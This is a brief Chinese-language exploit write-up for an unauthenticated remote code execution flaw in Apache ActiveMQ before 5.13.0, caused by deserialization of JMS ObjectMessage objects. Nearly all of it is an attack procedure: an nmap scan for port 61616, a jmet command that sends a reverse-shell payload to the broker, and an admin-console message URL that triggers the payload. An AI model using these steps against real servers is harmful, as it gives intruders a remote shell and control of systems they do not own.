## 漏洞概述

该漏洞源于程序没有限制可在代理中序列化的类。远程攻击者可借助特制的序列化的Java消息服务（JMS）ObjectMessage对象利用该漏洞执行任意代码。

## 影响范围

```http
ActiveMQ < 5.13.0
```

## EXP

1、确定目标开启61616端口

```bash
 nmap -sV -Pn -T4 -sC -p 61616 IP
```

2、发送反弹payload

```bash
java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y "反弹shell命令" -Yp target-IP 61616
```

3、点击触发Browse event-Message ID ，成功反弹

[http://IP:8161/admin/message.jsp?id=ID&JMSDestination=event](http://ip:8161/admin/message.jsp?id=ID&JMSDestination=event)